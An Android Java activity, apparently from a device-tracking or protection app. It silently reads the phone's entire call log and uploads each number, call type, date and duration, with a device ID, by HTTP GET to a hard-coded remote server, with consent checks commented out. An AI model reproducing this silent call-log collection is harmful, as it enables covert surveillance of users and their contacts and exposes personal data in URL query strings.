package com.qoopa.nodosshield;

import android.app.Activity;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class RegisterCallActivity extends Activity {

    private static final String serverHandlerURL = "https://www.nodos.com.co/universal_handler.php";
    JSONParser jsonParserNuevo = new JSONParser();
    JSONParser jsonParser = new JSONParser();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new SendCallsLogAsyncTask().execute();
        finish();

//        getCallDetails(); // Por el momento se deja diresto por incopatibilidad con las versiones de Android.

//        if (Build.VERSION.SDK_INT >= 23) {
//            Log.e("SDK","SDK mayor o igual a 23");
//            Activity act = this;
//
//            /*
//            ******* Paginas De Ayuda *******
//            * Historial
//            * http://android2011dev.blogspot.com.co/2011/08/get-android-phone-call-historylog.html
//            *
//            * Permisos Android 6+
//            * https://inthecheesefactory.com/blog/things-you-need-to-know-about-android-m-permission-developer-edition/en
//            * http://stackoverflow.com/questions/32134299/can-you-request-permissions-synchronously-in-android-marshmallow-api-23s-runt
//            */
//
//            if (act.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED &&
//                    act.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//
//                if (act.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
//                    Log.e("SDK", "Antes de pedir READ_CONTACTS permisos");
//                    act.requestPermissions(new String[]{android.Manifest.permission.READ_CONTACTS}, 0);
//                    while (true) {
//                        if (act.checkSelfPermission(android.Manifest.permission.READ_CONTACTS)== PackageManager.PERMISSION_GRANTED) {
//                            Log.e("Permisos", "Got permissions, exiting block loop");
//                            break;
//                        }
//                        try {
//                            Thread.sleep(1000);
//                        } catch (InterruptedException e) {
//                            Log.e("Permisos", "Error en el Thread.sleep(1000) de Manifest.permission.READ_CONTACTS");
//                            e.printStackTrace();
//                        }
//                    }
//                }
//
//                if (act.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//                    Log.e("Seguimiento", "Antes de pedir READ_CALL_LOG permisos");
//                    act.requestPermissions(new String[]{android.Manifest.permission.READ_CALL_LOG}, 0);
//                    while (true) {
//                        if (act.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG)== PackageManager.PERMISSION_GRANTED) {
//                            Log.i("Permisos", "Got permissions, exiting block loop");
//                            break;
//                        }
//                        try {
//                            Thread.sleep(1000);
//                        } catch (InterruptedException e) {
//                            Log.e("Permisos", "Error en el Thread.sleep(1000) de Manifest.permission.READ_CALL_LOG");
//                            e.printStackTrace();
//                        }
//                    }
//                    Log.e("Seguimiento", "despues de pedir permisos");
//                }
//
//                if (act.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED &&
//                        act.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//                    getCallDetails();
//                }
//            } else {
//                Log.e("Seguimiento", "YA tiene permisos");
//                getCallDetails();
//            }
//        } else {
//            Log.e("Seguimiento","SDK menor a 23");
//            getCallDetails();
//        }
    }

    private class SendCallsLogAsyncTask extends AsyncTask <String, String, JSONObject> { //Revisar Que un metodo llama a otro metodo!

        @Override
        protected JSONObject doInBackground(String... params) {
//        //Pruebas Database
//        Database mydb = new Database(getApplicationContext());
//        mydb.abrir();
//        String[][] datos = new String[0][];
//        try {
//            datos = mydb.consultarQueue();// consultarLocalizacion();
//        } catch (Exception e) {
//            LogUtil.printError("Error", "LockService - onCreate - tryPrueba");
//            LogUtil.printFullError("Error", "LockService - onCreate - tryPrueba", e);
//            //e.printStackTrace();
//        }
//        mydb.cerrar();
//
//        //datos = mydb.consultarLocalizacion(); D  consultarQueue
//                //

            getCallDetails();
            return null;
        }
    }

    private void getCallDetails() {
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);

        if (managedCursor.getCount()>0) {
            Log.e("Seguimiento","Si hay historial de llamadas");

            try {
                while ( managedCursor.moveToNext() ) {
                    String phNumber = managedCursor.getString( number );
                    String callType = managedCursor.getString( type );
                    String callDate = managedCursor.getString( date );

                    DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

                    Date callDayTime = new Date(Long.valueOf(callDate));

                    String callDuration = managedCursor.getString( duration );
                    String dir = null;
                    int dircode = Integer.parseInt( callType );
                    String FechaCambio = df.format(callDayTime);

                    switch( dircode ) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;

                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;

                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;
                        default:
                            Log.e("Seguimiento","default");
                            break;
                    }

                    JSONObject jsonprueba;

                    try {

                        //Log.e("***Seg***", "Enviando upload_call");
                        List<NameValuePair> params = new ArrayList<>();
                        params.add(new BasicNameValuePair("option", "upload_call"));
                        params.add(new BasicNameValuePair("terminal", LockService.getDeviceId()));
                        params.add(new BasicNameValuePair("number", phNumber.toString()));
                        params.add(new BasicNameValuePair("type", dir.toString()));
                        params.add(new BasicNameValuePair("date", FechaCambio.toString()));
                        params.add(new BasicNameValuePair("duration", callDuration.toString()));

                        //Log.e("***Seg***", "Datos: " + params.toString());
                        LogUtil.LogEnvioDatos(serverHandlerURL, params.toString());//SeguimientoDatos
                        jsonprueba = jsonParser.makeHttpRequest(serverHandlerURL, "GET", params);
                        LogUtil.LogEnvioDatos("Respuesta", jsonprueba.toString());//SeguimientoDatos
                        //Log.e("***json***","Respuesta: "+ jsonprueba.toString());
                        //Log.e("***json***", "Json Result: " + json.getString("result"));
                        //Log.e("***json***", "Json Error: " + json.getString("error"));
                    } catch (Exception e ) {
                        Log.e("***Error***","Error enviando upload_call");
                    }
                }
                //Log.e("Seguimiento", "despues while");
                //managedCursor.close(); //PENDIENTE
                //Log.e("Seguimiento", "final");
            } catch (Exception e) {
                Log.e("Error","Error en envio de numeros telefonicos.");
            }
        } else {
            Log.e("Seguimiento","No hay historial de llamadas");
        }
    }
}
